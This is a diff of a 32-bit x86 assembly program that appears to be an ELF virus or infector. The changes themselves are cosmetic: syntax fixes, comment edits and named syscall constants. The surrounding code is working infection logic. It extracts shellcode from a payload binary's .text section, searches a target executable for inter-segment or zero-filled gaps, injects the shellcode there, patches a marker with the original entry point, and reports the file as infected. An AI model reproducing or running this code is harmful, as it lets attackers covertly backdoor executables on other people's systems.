@@ -1,6 +1,8 @@
 %include "include/shared.s"
 			; optional TODO's lines: 106, 136, 258, 326
 			; todo's lines : 433
+; TODO : both files should be MAP_PRIVATE in mmap:
+
 STRUC	stat
 	before_size:	resb	20 	; the other elements don't really matter in this context, we just need
 	st_size: 	resd	1	; the st_size's offset, and the size of the structure
@@ -20,35 +22,35 @@ STRUC Elf32_Ehdr
 	e_phentsize:	resw	1
 	e_phnum:	resw	1
 	e_shentsize:	resw	1
-	e_shnum		resw	1
+	e_shnum:	resw	1
 	e_shstrndx:	resw	1
-	ENDSTRUC
+ENDSTRUC
 
-	STRUC Elf32_Shdr
-	sh_name		resd	1
-	sh_type		resd	1
-	sh_flags	resd	1
-	sh_addr		resd	1
-	sh_offset	resd	1
-	sh_size		resd	1
-	sh_link		resd	1
-	sh_info		resd	1
-	sh_addralign	resd	1
-	sh_entsize	resd	1
-	ENDSTRUC
+STRUC Elf32_Shdr
+	sh_name:	resd	1
+	sh_type:	resd	1
+	sh_flags:	resd	1
+	sh_addr:	resd	1
+	sh_offset:	resd	1
+	sh_size:	resd	1
+	sh_link:	resd	1
+	sh_info:	resd	1
+	sh_addralign:	resd	1
+	sh_entsize:	resd	1
+ENDSTRUC
 
-	STRUC Elf32_Phdr
-	p_type		resd	1
-	p_offset	resd	1
-	p_vaddr		resd	1
-	p_paddr		resd	1
-	p_filesz	resd	1
-	p_memsz		resd	1
-	p_flags		resd	1
-	p_align		resd	1
-	ENDSTRUC
+STRUC Elf32_Phdr
+	p_type:		resd	1
+	p_offset:	resd	1
+	p_vaddr:	resd	1
+	p_paddr:	resd	1
+	p_filesz:	resd	1
+	p_memsz:	resd	1
+	p_flags:	resd	1
+	p_align:	resd	1
+ENDSTRUC
 
-	section .bss
+section .bss
 	pivot_name:	resd 	1	; pivot file's name
 	pivot_fd:	resd 	1
 	pivot_size:	resd 	1
@@ -61,7 +63,7 @@ STRUC Elf32_Ehdr
 	shellcode:	resd 	1	; shellcode address is memorry
 	shellcode_size:	resd 	1
 
-	section .text
+section .text
 	global _start
 
 	_start:
@@ -181,14 +183,14 @@ next_map:
 	mov ebx, 1
 
 mmap_err:
-	push ERR_BAD_MMAP
+	push ERR_BAD_MMAP		; the return value
 	; ebx has a hint of what file failed to map
 	test ebx, ebx
 	je close_files			; elf failed -> nothing was mapped -> close files and exit
 	jmp unmap_elf			; pivot failed -> elf was mapped -> unmap elf, close files then exit
 
 after_mapping:
-	; next we have to check if both the target file and the payload are 32 but, if not then we exit
+	; next we have to check if both the target file and the payload are 32 bit little endian, if not we exit
 	push dword[pivot_data]
 	call is_target_elf		; returns -1 for false, 0 for true
 	test eax, eax			; is this a good file ?
@@ -200,7 +202,7 @@ after_mapping:
 	je checking_infection
 
 arch_err:
-	push ERR_NOT_TARGET
+	push ERR_NOT_TARGET		; the return value
 	jmp clean
 
 checking_infection:
@@ -222,6 +224,7 @@ checking_infection:
 	mov eax, [pivot_name]
 	push eax
 	call strlen
+
 	push eax
 	call print
 
@@ -236,16 +239,16 @@ checking_infection:
 
 extract_shellcode:
 
-	mov eax, [elf_data]
-	push eax
+	push dword[elf_data]
 	push shellcode_size
 	call find_shell 		; returns a pointer to the .text sections, and initializes
 					; the shellcode_size variable
 
 	test eax, eax			; shellcode == NULL ?
 	jne next
-	push ERR_NO_SHELL
+	push ERR_NO_SHELL		; the return
 	jmp clean
+
 next:
 	mov [shellcode], eax
 
@@ -253,7 +256,7 @@ patching:
 	push eax			; the shellcode address
 	push dword[shellcode_size]
 	push 0x69696969 		; the DOWRD to replace in the shellcode
- 	;push the entry point		; AKA the value we'd replace the above value with
+ 	; sending the shellcode entry point so we can replace that marker with it
 	mov eax, [pivot_data]
 	add eax, e_entry
 	push dword[eax]
@@ -357,6 +360,8 @@ leaving_mark:
 	push eax
 	call copy_data
 
+	;; printing "$FILE has been infected"
+
 	push STDOUT
 	mov eax, [pivot_name]
 	push eax
@@ -410,7 +415,7 @@ open:	; int open(char *file, int flags);
 	push ecx
 	;
 
-	mov eax, 0x5			; sys_open
+	mov eax, SYS_OPEN
 	mov ebx, [ebp + 0xc]		; file name
 	mov ecx, [ebp + 0x8]		; flags
 	int 0x80
@@ -435,7 +440,7 @@ mmap:	; void *mmap(DWORD size, int flags, int fd);
 	push edi
 	;;
 
-	mov eax, 0xc0			; sys_mmap_pgoff
+	mov eax, SYS_MMAP_PGOFF
 	xor ebx, ebx			; the kernal is free to map at any random address
 	mov ecx, [ebp + 0x10]		; file size
 	mov edx, PROT_READ_WRITE	; the whole goals is to be able to edit both files in memorry
@@ -513,6 +518,7 @@ copied:
 
 
 find_gap:	; void *find_gap(void *data, void *segment_Phdr, DWORD shellcode_size)
+
 	push ebp
 	mov ebp, esp
 	;saving used registers
@@ -520,22 +526,22 @@ find_gap:	; void *find_gap(void *data, void *segment_Phdr, DWORD shellcode_size)
 	push ecx
 	push edx
 
-method1:	; checking between-segments gaps ; this should work most of the time duo to in-file segments
+method1:	; checking between-segments gaps, this should work most of the time duo to in-file segments
 		; alignement
 	mov eax, [ebp + 0xc]		; our target segment header
 	mov ebx, [eax + p_offset]
-	add ebx, [eax + p_filesz] 	; we have a pointer to the end the executable segment in file
+	add ebx, [eax + p_filesz] 	; we have a pointer to the end of the executable segment in file
 
 	; now getting the offset of the next segment
 
-	add eax, Elf32_Phdr_size	; segment ++
+	add eax, Elf32_Phdr_size	; segment_Phdr ++
 	mov ecx, [eax + p_offset] 	; pointer to the start of the next segment in file
 
-	sub ecx, ebx			; ecx should have the gap size now
+	sub ecx, ebx			; calculating the gap size
 	cmp ecx, [ebp + 8]		; gap_size > shellcode_size ?
 	jl method2			; the shellcode won't fit in the gap
 
-	; gap = ebx = (segment_Phdr -> offset + segment_Phdr -> filesz) + memmory base
+	; gap = ebx = (segment_Phdr -> offset + segment_Phdr -> filesz)(ebx) + memorry base
 
 	add ebx, [ebp + 0x10]		; gap offset in file + memorry base = pointer to the gap in memorry
 	mov eax, ebx			; to return
@@ -545,21 +551,20 @@ method1:	; checking between-segments gaps ; this should work most of the time du
 method2:	; checking the in-segment 0-blocks
 	xor eax, eax			; the size of the current gap
 	mov ebx, [ebp + 0xc]		; segment header file
+	mov edx, [ebx + p_filesz]	; segment size
 
-	mov ebx, [ebx + p_offset]
+	mov ebx, [ebx + p_offset]	; segment data in file
+	mov ecx, -1			; the loop counter
 	add ebx, [ebp + 0x10]		; segment data in memorry
 
-	mov ecx, -1			; the loop counter
 
-	mov edx, [ebp + 0x10]
-	mov edx, [edx + p_filesz]	; segment size
 
 parsing_data:
 	inc ecx				; ++i
 	cmp ecx, edx			; i > seg_size ?
 	je no_gap
 
-	cmp byte[ebx + ecx], 0		; segment[i] == 0 ?
+	cmp byte[ebx + ecx], 0		; segment[i] == 0 ? ; TODO : use lodsb and rsi instead
 	jne check_and_reset
 	inc eax				; ++ gap_size
 	jmp parsing_data
@@ -571,10 +576,10 @@ check_and_reset:
 	sub ecx, eax			; i - current_size
 	add ebx, ecx			; segment + i - current_size
 	mov eax, ebx			; the value to return
-	jmp found_gap
+	jmp found_gap			; this was ret_gap, in case replacing it causes some error
 
 reset_counter:
-	xor eax, eax 			; current gap size = 0
+	xor eax, eax 			; gap_size = 0
 	jmp parsing_data
 
 no_gap:
@@ -605,7 +610,7 @@ ret_gap:
 
 
 
-patch_jump_point:	;bool patch_jump_point(char *shellcode, size_t size, DWORD marker, DWORD entry_point)
+patch_jump_point:	; bool patch_jump_point(char *shellcode, size_t size, DWORD marker, DWORD entry_point)
 	push ebp
 	mov ebp, esp
 	;storing used registers
@@ -616,12 +621,12 @@ patch_jump_point:	;bool patch_jump_point(char *shellcode, size_t size, DWORD mar
 	mov eax, [ebp + 0x14]	 	; shellcode
 	mov ecx, [ebp + 0x10]		; size
 	mov edx, [ebp + 0xc] 		; the marker which is 0x69696969 in this case
-	; the combo eax + ecx points at the last byte in the shellcode string (\0) but we need it to point 
+	; the combo eax + ecx points at the last byte in the shellcode ('\0') but we need it to point 
 	; at the last DWORD
-	; so -1 byte for the null byte and -3 to point at the last valid DWORD
+	; so -1 byte for '\0' and -3 to point at the last DWORD
 	sub ecx, 4
 
-marker_loop:	; will be searching from the end to start as that is where the marker is likely to be
+marker_loop:	; will be searching backwards from the end as that's where the marker is likely to be
 	cmp dword[eax + ecx], edx
 	je found_marker
 
@@ -634,13 +639,13 @@ no_mark_found:
 	push no_marker_len
 	call print
 	add esp, 0xc
-	mov eax, -1			; returns FALSE
+	mov eax, -1			; return FALSE
 	jmp ret_patch
 
 found_marker:
 	mov ebx, [ebp + 0x8]		; the original entry point
 	mov [eax + ecx], ebx 		; patching the shellcode return address
-	xor eax, eax 			; returns TRUE
+	xor eax, eax 			; return TRUE
 
 ret_patch:
 	;restoring saved register
@@ -652,7 +657,7 @@ ret_patch:
 
 
 
-find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a pointer to .text section, and stores the shellcode size
+find_shell:	; void *find_shell(void *data, size_t shellcode_size); returns a pointer to the .text section and stores the shellcode size
 	push ebp
 	mov ebp, esp
 
@@ -665,7 +670,7 @@ find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a poi
 
 	mov ebx, [ebp + 0xc] 		; this will stay in ebx for the rest of the function so we don't keep accessing memorry
 
-	;;taking care of the generic section pointer (@ ebp - 4)
+	;;taking care of the generic section pointer
 	mov edi, [ebx + e_shoff]
 	add edi, ebx			; for later
 	;;
@@ -675,13 +680,13 @@ find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a poi
 	mov ax, word[ebx + e_shstrndx]
 	movzx eax, ax
 	mov ecx, Elf32_Shdr_size
-	mul cl				; eax now has the string table file offset in file, and edx has 
+	mul cx				; eax now has the string table file offset in file, and edx has 
 					; the sections base in memorry
 	add eax, edi
 	; now we have a pointer to the string table section, but we want the actuall offset of the section
 	; in memorry
 	mov edx, [eax + sh_offset]
-	add edx, ebx			; from now on, edx will have the pointer to the string index table, 
+	add edx, ebx			; from now on, edx will haveae pointer to the string index table, 
 					; we're gonna use this later
 
 
@@ -697,6 +702,7 @@ parsing_loop:
 	add esi, edx
 	push esi
 	call strcmp
+
 	add esp, 4			; so we don't have to keep track of the stack 
 	;do some error checking
 	test eax, eax
@@ -718,7 +724,7 @@ no_text_section:
 
 found_text_section:;
 	;storing the address of the section header
-	mov eax, edi			; the section header pointer
+	;mov eax, edi			; the section header pointer
 	mov eax, [edi + sh_offset] 	; the actual section offset
 	add eax, ebx			; ebx still contains the mmap memory base ; this eax will be returned to 
 					; the previous function!
@@ -751,7 +757,7 @@ unmap:	; void unmap(void *data, size_t size);
 	push ecx
 	;
 
-	mov eax, 0x5b
+	mov eax, SYS_MUNMAP
 	mov ebx, [ebp + 0xc]
 	mov ecx, [ebp + 0x8]
 	int 0x80
@@ -775,7 +781,7 @@ close: ; void close(int fd);
 	push ebx
 	;
 
-	mov eax, 0x6
+	mov eax, SYS_CLOSE
 	mov ebx, [ebp + 0x8]
 	int 0x80
 
@@ -797,14 +803,14 @@ get_file_size:	; size_t get_file_size(int fd);
 	; reserving space for stat structure in the stack
 	sub esp, stat_size
 
-	mov eax, 0x6c
+	mov eax, SYS_NEW_FSTAT
 	mov ebx, [ebp + 0x8]
 	mov ecx, esp
 
 	int 0x80
 
 	mov eax, [ecx + st_size]
-	add esp, stat_size
+	add esp, stat_size		; remove the structure of the stack
 
 	test eax, eax
 	jns ret_size
@@ -835,7 +841,7 @@ print: ; void print(int fd, char *buf, size_t len);
 	push ecx
 	push edx
 	; performing the syscall
-	mov eax, 4
+	mov eax, SYS_WRITE
 	mov ebx, [ebp + 0x10]
 	mov ecx, [ebp + 0xc]
 	mov edx, [ebp + 0x8]
@@ -954,7 +960,7 @@ cmp_loop:
 	xor dh, dl
 	jne diff_buffers
 
-	dec ecx  ; dec does take care of the flags
+	dec ecx  			; dec does take care of the flags
 	jns cmp_loop
 	jmp same_buffers
 
@@ -977,7 +983,7 @@ end:
 
 
 
-exit:	;void exit(int return_stat)
+exit:	;void exit(int return_state)
 	xor eax, eax
 	pop ebx
 	inc eax
